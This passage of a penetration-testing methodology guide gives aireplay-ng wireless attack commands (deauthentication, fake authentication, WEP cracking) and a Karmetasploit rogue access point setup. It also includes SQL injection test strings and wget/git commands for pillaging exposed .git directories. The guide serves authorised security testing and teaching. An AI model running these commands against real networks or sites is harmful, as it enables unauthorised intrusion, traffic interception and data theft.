<span class="n">The</span> <span class="n">option</span> <span class="n">can</span> <span class="n">be</span> <span class="n">specified</span> <span class="n">multiple</span>   <span class="n">times</span><span class="o">.</span>  <span class="n">In</span> <span class="n">this</span> <span class="n">case</span><span class="p">,</span> <span class="n">each</span> <span class="n">file</span> <span class="nb">format</span> <span class="n">specified</span> <span class="n">will</span> <span class="n">be</span> <span class="n">output</span><span class="o">.</span>  <span class="n">Only</span> <span class="n">ivs</span> <span class="ow">or</span> <span class="n">pcap</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span><span class="p">,</span> <span class="ow">not</span> <span class="n">both</span><span class="o">.</span>
</pre></div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_157.png">Screenshot Here</a></p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_158.png">Screenshot Here</a></p>
<p><strong>Aireplay-ng</strong></p>
<p>Aireplay-ng is primarily used to generate or accelerate traffic for the
later use with Aircrack-ng (for cracking WEP keys). Aireplay-ng supports
various attacks such as deauthentication, fake authentication,
Interactive packet replay, hand-crafted ARP request injection and
ARP-request re injection. Usage:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">options</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">replay</span> <span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>These are the attack names and their corresponding &#8220;numbers&#8221;:</p>
<ul class="simple">
<li>&#8216;&#8217;&#8216;Attack 0: &#8216;&#8217;&#8216;Deauthentication</li>
<li>&#8216;&#8217;&#8216;Attack 1: &#8216;&#8217;&#8216;Fake authentication</li>
<li>&#8216;&#8217;&#8216;Attack 2: &#8216;&#8217;&#8216;Interactive packet replay</li>
<li>&#8216;&#8217;&#8216;Attack 3: &#8216;&#8217;&#8216;ARP request replay attack</li>
<li>&#8216;&#8217;&#8216;Attack 4: &#8216;&#8217;&#8216;KoreK chopchop attack</li>
<li>&#8216;&#8217;&#8216;Attack 5: &#8216;&#8217;&#8216;Fragmentation attack</li>
<li>&#8216;&#8217;&#8216;Attack 9: &#8216;&#8217;&#8216;Injection test</li>
</ul>
<p>Note: Not all options apply to all attacks.</p>
<p><strong>Attack 0 - Deauthentication</strong></p>
<div class="line-block">
<div class="line">A deauthentication attack sends disassociation packets to one or more
clients who are currently associated with an AP. Disassociating
clients can reveal a hidden / cloaked ESSID. Deauthentication attacks
also provide an ability to capture WPA/WPA2 handshakes by forcing
clients to re-authenticate.</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">0</span> <span class="mi">1</span> <span class="o">-</span><span class="n">a</span> <span class="mi">34</span><span class="p">:</span><span class="n">EF</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="n">BB</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="n">C1</span> <span class="o">-</span><span class="n">c</span> <span class="mi">00</span><span class="p">:</span><span class="n">E0</span><span class="p">:</span><span class="mi">4</span><span class="n">C</span><span class="p">:</span><span class="mi">6</span><span class="n">D</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">8</span><span class="n">D</span> <span class="n">wlan0</span>
</pre></div>
</div>
<ul class="simple">
<li>-0 means deauthentication</li>
<li>1 is the number of deauths to send (you can send multiple if you
wish); 0 means send them continuously</li>
<li>-a 34:EF:44:BB:14:C1 is the MAC address of the access point</li>
<li>-c 00:E0:4C:6D:27:8D is the MAC address of the client to
deauthenticate; if this is omitted then all clients are
deauthenticated</li>
<li>wlan0 is the interface name</li>
</ul>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_159.png">Screenshot Here</a></p>
<p><strong>Attack 1 - Fake authentication</strong></p>
<p>The fake authentication attack allows you to perform the two types of
WEP authentication (Open System and Shared Key) and to associate with an
AP. This attack is useful in scenarios where there are no associated
clients. Note that fake authentication attacks do not generate ARP
packets.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">1</span> <span class="mi">0</span> <span class="o">-</span><span class="n">e</span> <span class="mi">2</span><span class="n">WIRE696</span> <span class="o">-</span><span class="n">a</span> <span class="mi">34</span><span class="p">:</span><span class="n">EF</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="n">BB</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="n">C1</span> <span class="o">-</span><span class="n">h</span> <span class="mi">00</span><span class="p">:</span><span class="n">E0</span><span class="p">:</span><span class="mi">4</span><span class="n">C</span><span class="p">:</span><span class="mi">6</span><span class="n">D</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">8</span><span class="n">D</span> <span class="n">wlan0</span>
</pre></div>
</div>
<ul class="simple">
<li>-1 means fake authentication</li>
<li>0 reassociation timing in seconds</li>
<li>-e 2WIRE696 is the wireless network name</li>
<li>-a 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is our card MAC address</li>
<li>wlan0 is the wireless interface name</li>
</ul>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_160.png">Screenshot Here</a></p>
<p><strong>Attack 3 - ARP Request Replay Attack</strong></p>
<p>The classic ARP request replay attack is the most effective way to
generate new initialization vectors. This attack is probably the most
reliable of all. The program listens for an ARP packet then retransmits
it back to the AP. This, in turn causes the AP to repeat the ARP packet
with a new IV. The program retransmits the same ARP packet over and
over. However, each ARP packet repeated by the AP has a new IV. The
collection of these IVs will later help us later in determining the WEP
key.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">3</span> <span class="o">-</span><span class="n">b</span> <span class="mi">34</span><span class="p">:</span><span class="n">EF</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="n">BB</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="n">C1</span> <span class="o">-</span><span class="n">h</span> <span class="mi">00</span><span class="p">:</span><span class="n">E0</span><span class="p">:</span><span class="mi">4</span><span class="n">C</span><span class="p">:</span><span class="mi">6</span><span class="n">D</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">8</span><span class="n">D</span> <span class="n">wlan0</span>
</pre></div>
</div>
<ul class="simple">
<li>-3 means standard arp request replay</li>
<li>-b 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is the source MAC address (either an associated
client or from fake authentication)</li>
<li>wlan0 is the wireless interface name</li>
</ul>
<p><strong>Attack 4 - KoreK chopchop</strong></p>
<p>The KoreK chopchop attack can decrypt a WEP data packet without knowing
the key. It can even work against dynamic WEP. <em>This attack does not
recover the WEP key itself, it merely reveals the plaintext</em>. Some APs
are not vulnerable to this attack. They may seem vulnerable at first but
actually drop data packets shorter than 60 bytes. If the AP drops
packets shorter than 42 bytes, Aireplay tries to guess the rest of the
missing data, as far as the headers are predictable. If an IP packet is
captured Aireplay checks if the checksum of the header is correct after
guessing its missing parts. Remember that this attack requires at least
one WEP data packet.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">4</span> <span class="o">-</span><span class="n">b</span> <span class="mi">34</span><span class="p">:</span><span class="n">EF</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="n">BB</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="n">C1</span> <span class="o">-</span><span class="n">h</span> <span class="mi">00</span><span class="p">:</span><span class="n">E0</span><span class="p">:</span><span class="mi">4</span><span class="n">C</span><span class="p">:</span><span class="mi">6</span><span class="n">D</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">8</span><span class="n">D</span> <span class="n">wlan0</span>
</pre></div>
</div>
<ul class="simple">
<li>-4 means the chopchop attack</li>
<li>-b 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is the source MAC address (either an associated
client or from fake authentication)</li>
<li>wlan0 is the wireless interface name</li>
</ul>
<p><strong>Attack 5 - Fragmentation Attack</strong></p>
<p>The fragmentation attack does not recover the WEP key itself, but (also)
obtains the PRGA (pseudo random generation algorithm) of the packet. The
PRGA can then be used to generate packets with Packetforge-ng which are
in turn are used for various injection attacks. The attack requires at
least one data packet to be received from the AP in order to initiate
the attack. Basically, the program obtains a small amount of keying
material from the packet then attempts to send ARP and/or LLC packets
with known content to the AP. If the packet is successfully echoed back
by the AP then a larger amount of keying information can be obtained
from the returned packet. This cycle is repeated several times until
1500 bytes of PRGA are obtained (sometimes less than 1500 bytes).</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">5</span> <span class="o">-</span><span class="n">b</span> <span class="mi">34</span><span class="p">:</span><span class="n">EF</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="n">BB</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="n">C1</span> <span class="o">-</span><span class="n">h</span> <span class="mi">00</span><span class="p">:</span><span class="n">E0</span><span class="p">:</span><span class="mi">4</span><span class="n">C</span><span class="p">:</span><span class="mi">6</span><span class="n">D</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">8</span><span class="n">D</span> <span class="n">wlan0</span>
</pre></div>
</div>
<ul class="simple">
<li>-5 means run the fragmentation attack</li>
<li>-b 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is the source MAC address (either an associated
client or from fake authentication)</li>
<li>wlan0 is the wireless interface name</li>
</ul>
<p><strong>Attack 9: Injection test</strong></p>
<p>The injection test determines if your card can successfully inject
wireless packets, and measures ping response times to APs. If you have
two wireless cards connected, the test can also determine which specific
injection attacks can be successfully executed. The basic injection test
lists the APs in the area which respond to broadcast probes, and for
each it performs a 30 packet test which measures the connection quality.
This connection quality quantifies the ability of your card to
successfully send and receive a response to the test target. The
percentage of responses received gives a good indication of the link
quality.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">9</span> <span class="n">wlan0</span>
</pre></div>
</div>
<p>Where:</p>
<ul class="simple">
<li>-9 - Injection test.</li>
<li>wlan0 - the interface name</li>
</ul>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_161.png">Screenshot Here</a></p>
<p><strong>Aircrack-ng</strong></p>
<p>Aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.
Aircrack-ng can recover the WEP key once enough encrypted packets have
been captured with airodump-ng. This part of the Aircrack-ng suite
determines the WEP key using two fundamental methods. The first method
is via the PTW approach (Pyshkin, Tews, and Weinmann). The default
cracking method is PTW.</p>
<p>For cracking WPA/WPA2 pre-shared keys, only a dictionary method is used.
SSE2 support is included to dramatically speed up WPA/WPA2 key
processing. A &#8220;four-way handshake&#8221; is required as input. For WPA
handshakes, a full handshake is composed of four packets. However,
Aircrack-ng is able to work successfully with just 2 packets. EAPOL
packets (2 and 3) or packets (3 and 4) are considered a full handshake.</p>
</div>
</div>
</div>
<div class="section" id="attacking-the-user">
<h3>Attacking the User<a class="headerlink" href="#attacking-the-user" title="Permalink to this headline">¶</a></h3>
<p>The Rules of Engagment (ROE) should be validated to ensure this is
in-scope before conducting any attacks against the users</p>
<p>Karmetasploit is a modification of the KARMA to integrate it into
Metasploit. Karmetasploit creates a working &#8220;evil&#8221; access point working
that provides network services to an unsuspecting user. The services
Karmetasploit provides include a DNS daemon that responds to all
requests, a POP3 service, an IMAP4 service, a SMTP service, a FTP
service, a couple of different SMB services, and a web service. All DNS
lookups result in the IP address of the access point being returned,
resulting in a blackhole effect for all email, web, and other network
traffic.</p>
<p>To run Karmetasploit, use aireplay-ng to verify that injection is
functioning:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="c1"># aireplay-ng --test [monitor-interface]</span>
</pre></div>
</div>
<p>The output of aireplay-ng should indicate that injection is working and
that one of the local access points could be reached. If every access
point returns 0% and the message indicating injection is working is not
there, you likely need to use a different/patched driver or a different
wireless card.</p>
<p>The Metasploit Framework does not have a DHCP module, so a third-party
DHCP service must be configured and installed. The easiest way to
accomplish this is by installed the &#8220;dhcpd&#8221; package. On Backtrack 4 R2,
the package is called &#8220;dhcpd3&#8221;or on Backtrack 5, the package is called
&#8220;dhcp3-server&#8221;.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">dhcp3</span><span class="o">-</span><span class="n">server</span>
</pre></div>
</div>
<p>Once the DHCP server has been installed, an appropriate configuration
file needs to be created. This file is normally called &#8220;dhcpd.conf&#8221; or
&#8220;dhcpd3.conf&#8221; and resides in /etc, /etc/dhcp, or /etc/dhcp3. The example
below uses the 10.0.0.0/24 network with the access point configured at
10.0.0.1.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">default</span><span class="o">-</span><span class="n">lease</span><span class="o">-</span><span class="n">time</span> <span class="mi">60</span><span class="p">;</span>
<span class="nb">max</span><span class="o">-</span><span class="n">lease</span><span class="o">-</span><span class="n">time</span> <span class="mi">72</span><span class="p">;</span>

<span class="n">ddns</span><span class="o">-</span><span class="n">update</span><span class="o">-</span><span class="n">style</span> <span class="n">none</span><span class="p">;</span>

<span class="n">authoritative</span><span class="p">;</span>

<span class="n">log</span><span class="o">-</span><span class="n">facility</span> <span class="n">local7</span><span class="p">;</span>

<span class="n">subnet</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.0</span> <span class="n">netmask</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="p">{</span>
  <span class="nb">range</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.100</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.254</span><span class="p">;</span>
  <span class="n">option</span> <span class="n">routers</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">;</span>
  <span class="n">option</span> <span class="n">domain</span><span class="o">-</span><span class="n">name</span><span class="o">-</span><span class="n">servers</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>To run Karmetasploit, there are three things that need to happen. First,
airbase-ng must be started and configured as a greedy wireless access
point. The following example will beacon the ESSID of the target
company, respond to all probe requests, and rebroadcast all probes as
beacons for 30 seconds:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airbase</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="n">P</span> <span class="o">-</span><span class="n">C</span> <span class="mi">30</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;&lt;COMPANY ESSID&gt;&quot;</span> <span class="o">-</span><span class="n">v</span> <span class="p">[</span><span class="n">monitor</span><span class="o">-</span><span class="n">interface</span><span class="p">]</span>
</pre></div>
</div>
<p>Second, we need to configure the IP address of the at0 interface to
match.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ifconfig</span> <span class="n">at0</span> <span class="n">up</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="n">netmask</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
</pre></div>
</div>
<p>Third, the DHCP server needs to be started on the &#8220;at0&#8221; TUN/TAP
interface created by airbase-ng:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dhcpd</span> <span class="o">-</span><span class="n">cf</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">dhcpd</span><span class="o">.</span><span class="n">conf</span> <span class="n">at0</span>
</pre></div>
</div>
<p>Finally, the Metasploit Framework itself needs to be configured. While
its possible to configure each service by hand, its more efficient to
use a resource file with the msfconsole interface. A sample resource
file, configured to use 10.0.0.1 as the access point address, with
nearly every feature enabled, can be downloaded here
<a class="reference external" href="http://digitaloffense.net/tools/karma.rc">2</a>. To use this resource
file, run msfconsole with the -r parameter. Keep in mind that msfconsole
must be run as root for the capture services to function.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msfconsole</span> <span class="o">-</span><span class="n">r</span> <span class="n">karma</span><span class="o">.</span><span class="n">rc</span>
</pre></div>
</div>
<p>Once the Metasploit Framework processes the commands in the resource
file, the standard msfconsole shell will be available for commands. As
clients connect to the access point and try to access the network, the
service modules will do what they can to extract information from the
client and exploit browser vulnerabilities.</p>
<p>&lt;Contribution Needed&gt;</p>
<p>&lt;Contribution Needed&gt;</p>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>DoS / Blackmail angle</li>
</ul>
<p>A web application involves a web server that accepts input and is most
often interfaced using http(s). The penetration tester’s goal is to
discover any interaction points that can be manipulated to access
information, functionality or services beyond the web applications
intended use. Quite often a web application will comprise of tiers. The
tiers are generally broken up into web, application, and data. These
tiers can run on one or more servers, and any of the tiers may be load
balanced across multiple servers. In the quest to find all the entry
points, during the intelligence gathering and vulnerability analysis
phase the penetration tester will utilize mostly GET and POST requests
but should also test head, put, delete, trace, options, connect and
patch. The objective is to map all input and output points. These are
not limited to simply forms on a page, but include cookies, links,
hidden forms, http parameters, etc. During the exploration particular
attention should be given to sessions, cookies, error pages, http status
codes, indirectly accessible pages, encryption usage and server
configuration, dns and proxy cache usage. Ideally, this will be done
using both automated and manual methods to discover potential ways to
manipulate the web application parameters or logic. This is generally
done using some form of client application (browser) and a proxy that
can sit between the client application and the web application, and a
tool to crawl (aka spider) through page links.</p>
<p>SQL Injection (SQLi)</p>
<p>According to OWASP (<a class="reference external" href="https://www.owasp.org/index.php/SQL_Injection">https://www.owasp.org/index.php/SQL_Injection</a>) SQL
Injection, or as it is more commonly known SQLi, consists of insertion
or &#8220;injection&#8221; of a SQL query via the input data from the client to the
application. A successful SQL injection exploit can read sensitive data
from the database, modify database data (Insert/Update/Delete), execute
administration operations on the database (such as shutdown the DBMS),
recover the content of a given file present on the DBMS file system and
in some cases issue commands to the operating system. SQL injection
attacks are a type of injection attack, in which SQL commands are
injected into data-plane input in order to effect the execution of
predefined SQL commands.</p>
<p>SQL (Structured Query Language) is an interpretted programming language
for interfacing with a database. It is sometimes also lazily used to
refer to the database management system. Applications utilize a database
to store/retrieve and process information. The database is usually a
relational database, where data is stored in one more tables, each table
has values in one or more columns (data types/attributes) and rows
(element/tuple). There are several implementations of SQL and each has
their own commands and syntax. A few common commands are: select -
retrieve data union - combine results of two or more selects insert -
add new data update - modify existing data delete - delete data</p>
<p>What is injection? Simply stated, SQL injection exploits a vulnerability
that allows data sent to an application to be interpreted and run as SQL
commands.</p>
<p>According to OWASP (<a class="reference external" href="https://www.owasp.org/index.php/SQL_Injection">https://www.owasp.org/index.php/SQL_Injection</a>) SQL
Injection, also known as SQLi, consists of insertion or &#8220;injection&#8221; of a
SQL query via the input data from the client to the application.</p>
<p>A successful SQL injection exploit can read sensitive data from the
database, modify database data (Insert/Update/Delete), execute
administration operations on the database (such as shutdown the DBMS),
recover the content of a given file present on the DBMS file system and
in some cases issue commands to the operating system. SQL injection
attacks are a type of injection attack, in which SQL commands are
injected into data-plane input in order to effect the execution of
predefined SQL commands. SQL injection is typically discovered in the
Vulnerability Analysis phase (and maybe hinted at in the intelligence
gathering phase) of the engagement.</p>
<p>One possible way to test for sql injection is to enter a &#8216; into input
fields then compare the application response to a well formed request.
If the web application is vulnerable to SQLi, a &#8216; may return different
results when the SQL statement attempts to execute. Was an error message
returned, different results, web page a different size, are different
HTTP codes returned. Don&#8217;t forget to look at the source, not just what
is displayed in the browser. Depending on the reaction, it may be
necessary to use other tests for injection, for example &#8221; or &#8216;; or ) or
&#8216;+&#8221;=&#8217; or %27%20or%201=1. It may also be necessary to encode the
characters to bypass filters. If the access to the source code of the
application is available, review for any variables where input can be
manipulated as part of the application usage. In some cases this will be
readily apparent, for instance php $sql = &#8220;SELECT * from [table] WHERE
tuple = &#8216;$_GET(&#8220;input&#8221;]&#8217;&#8221;; c# $sql = &#8220;SELECT * from [table] WHERE
tuple = &#8216;&#8221; + request.getParameter(&#8220;input&#8221;) = &#8220;&#8217;&#8221;;</p>
<p>Several tools are available for the identification and exploitation of
SQLi</p>
<p>Several tools are available for the identification and exploitation of
SQLi. SQLi Tools</p>
<ul class="simple">
<li>Havij (<a class="reference external" href="http://itsecteam.com/en/projects/project1.htm">http://itsecteam.com/en/projects/project1.htm</a>)</li>
<li>SQLmap (<a class="reference external" href="http://sqlmap.sourceforge.net">http://sqlmap.sourceforge.net</a>)</li>
<li>The Mole (<a class="reference external" href="http://sourceforge.net/projects/themole">http://sourceforge.net/projects/themole</a>)</li>
<li>Pangolin (<a class="reference external" href="http://nosec.org/en/productservice/pangolin">http://nosec.org/en/productservice/pangolin</a>)</li>
</ul>
<p>XSS</p>
<p>&lt;Contribution Needed&gt;</p>
<p>CSRF</p>
<p>&lt;Contribution Needed&gt;</p>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Information Leakage</li>
</ul>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>FW/WAF/IDS/IPS Evasion</li>
<li>Human Evasion</li>
<li>DLP Evasion</li>
</ul>
<p>&lt;Contribution Needed&gt;</p>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Client Side</li>
<li>Phishing (w/pretext)</li>
<li>Service Side</li>
<li>Out of band</li>
<li>Post-Exploitation</li>
<li>Infrastructure analysis</li>
</ul>
<p>The Social-Engineering Toolkit (SET) is a python-driven suite of custom
tools which solely focuses on attacking the human element of pentesting.
It’s main purpose is to augment and simulate social-engineering attacks
and allow the tester to effectively test how a targeted attack may
succeed. Currently SET has two main methods of attack, one is utilizing
Metasploit payloads and Java-based attacks by setting up a malicious
website (which you can clone whatever one you want) that ultimately
delivers your payload. The second method is through file-format bugs and
e-mail phishing. The second method supports your own open-mail relay, a
customized sendmail open-relay, or Gmail integration to deliver your
payloads through e-mail. The goal of SET is to bring awareness to the
often forgotten attack vector of social-engineering. You can see
detailed <a class="reference external" href="http://www.secmaniac.com/tutorials/">tutorials here</a> or by
downloading the <a class="reference external" href="http://svn.secmaniac.com/social_engineering_toolkit/readme/User_Manual.pdf">user manual
here</a>.</p>
</div>
<div class="section" id="vpn-detection">
<h3>VPN detection<a class="headerlink" href="#vpn-detection" title="Permalink to this headline">¶</a></h3>
<p>VPN Hunter (<a class="reference external" href="http://www.vpnhunter.com">http://www.vpnhunter.com</a>) discovers and classifies SSL VPNs
from top vendors including Juniper, Cisco, Palo Alto, Citrix, Fortinet,
F5, SonicWALL, Barracuda, Microsoft, and Array. VPN Hunter will also
attempt to detect whether two-factor authentication is enabled on the
target SSL VPNs.</p>
</div>
<div class="section" id="route-detection-including-static-routes">
<h3>Route detection, including static routes<a class="headerlink" href="#route-detection-including-static-routes" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<p>&lt;Contribution Needed&gt;</p>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Network Level</li>
<li>Application Level</li>
</ul>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Mapping connectivity in/out of every segment</li>
<li>Lateral connectivity</li>
</ul>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="pillaging">
<h3>Pillaging<a class="headerlink" href="#pillaging" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<div class="section" id="video-cameras">
<h4>Video Cameras<a class="headerlink" href="#video-cameras" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="data-exfiltration">
<h4>Data Exfiltration<a class="headerlink" href="#data-exfiltration" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>identify web servers</li>
<li>identify ftp servers</li>
<li>DNS and ICMP tunnels</li>
<li>VoIP channels</li>
<li>Physical channels (printing, garbage disposal, courier)</li>
<li>Fax (on multifunction printers)</li>
</ul>
</div>
<div class="section" id="locating-shares">
<h4>Locating Shares<a class="headerlink" href="#locating-shares" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="audio-capture">
<h4>Audio Capture<a class="headerlink" href="#audio-capture" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>VoIP</li>
<li>Microphone</li>
</ul>
</div>
<div class="section" id="high-value-files">
<h4>High Value Files<a class="headerlink" href="#high-value-files" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
</div>
<div class="section" id="database-enumeration">
<h4>Database Enumeration<a class="headerlink" href="#database-enumeration" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Checking for PPI</li>
<li>card data</li>
<li>passwords/user accounts</li>
</ul>
</div>
<div class="section" id="wifi">
<h4>Wifi<a class="headerlink" href="#wifi" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>Steal wifi keys</li>
<li>Add new Wifi entries with higher preference then setup AP to force
connection</li>
<li>Check ESSIDs to identify places visited</li>
</ul>
</div>
<div class="section" id="source-code-repos">
<h4>Source Code Repos<a class="headerlink" href="#source-code-repos" title="Permalink to this headline">¶</a></h4>
<p>&lt;Contribution Needed&gt;</p>
<ul class="simple">
<li>SVN</li>
<li>CVS</li>
<li>MS Sourcesafe</li>
<li>WebDAV</li>
</ul>
</div>
<div class="section" id="git">
<h4>Git<a class="headerlink" href="#git" title="Permalink to this headline">¶</a></h4>
<p>Git is a distributed version control system (DVCS) and the meta
directory (.git) contains all the necessary information to re-create the
state of the repository at any given point in time.</p>
<p>Git is often used to deploy web applications and the .git meta directory
is sometimes available to pillage.</p>
<p><strong>Identify the repo</strong></p>
<p>One quick way to find the repo is to look for the file
<a class="reference external" href="http://example.com/.git/HEAD">http://example.com/.git/HEAD</a> and see if it contains a match to ^ref:
refs/ W3AF (<a class="reference external" href="http://w3af.sourceforge.net/">http://w3af.sourceforge.net/</a>) contains a discovery plugin
named findGit.py that will assist in finding git repositories of web
targets.</p>
<p>Note: the .git directory is not always present in the root, but
sometimes in sub directories depending on how a part of the application
is deployed. Something like <a class="reference external" href="http://example.com/blog/.git/">http://example.com/blog/.git/</a></p>
<p><strong>Cloning the repo</strong></p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">git</span> <span class="n">clone</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
</pre></div>
</div>
<p>If an error like this is the result of the clone attempt then you have
to resort to pillaging in different ways as the repo is not easily
cloneable.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>fatal: http://example.com/info/refs not found: did you run git update-server-info on the server?
</pre></div>
</div>
<p><strong>Check for directory browsing</strong></p>
<p>If directory browsing is open for <a class="reference external" href="http://example.com/.git/objects">http://example.com/.git/objects</a> then
wget can be used to download the repo and then re-construct it.</p>
<p>Example:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>wget -m —no-parent http://example.com/.git
cd example.com
git reset —hard
</pre></div>
</div>
<p><strong>Other useful data</strong></p>
<p>If both of these scenarios fail to get you the contents of the git repo
there is still other information that may be of value. These files with
predictable file names can contain very useful information and are
detailed below.</p>
<ul class="simple">
<li>.git/index</li>
</ul>
<p>“The index is a binary file (generally kept in .git/index) containing a
sorted list of path names, each with permissions and the SHA1 of a blob
object; git ls-files can show you the contents of the index:”
(<a class="reference external" href="http://book.git-scm.com/7_the_git_index.html">http://book.git-scm.com/7_the_git_index.html</a>)</p>
<ol class="arabic simple">
<li>Platform details (.php, .cgi, etc)</li>
<li>Files that may contain configuration details (that are not rendered)</li>
<li>.old</li>
<li>.new</li>
<li>.bak</li>
<li>.tar.gz</li>
<li>.txt</li>
<li>Database dumps .sql</li>
</ol>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">mkdir</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">cd</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">mkdir</span> <span class="o">.</span><span class="n">git</span>
<span class="n">wget</span> <span class="n">get</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">index</span> <span class="o">-</span><span class="n">O</span> <span class="o">.</span><span class="n">git</span><span class="o">/</span><span class="n">index</span>
<span class="n">git</span> <span class="n">init</span> <span class="o">.</span>
<span class="n">git</span> <span class="n">ls</span><span class="o">-</span><span class="n">files</span>
</pre></div>
</div>
<ul class="simple">
<li>.git/config</li>
</ul>
<p>Contains repo locations, usernames / email addresses, possibly other
targets one could attack.</p>
<ul class="simple">
<li>.git/logs/HEAD</li>
</ul>
<p>Contains commit messages if any editing and committing has been done on
the server.</p>
<ul class="simple">
<li>.git/hooks/*</li>
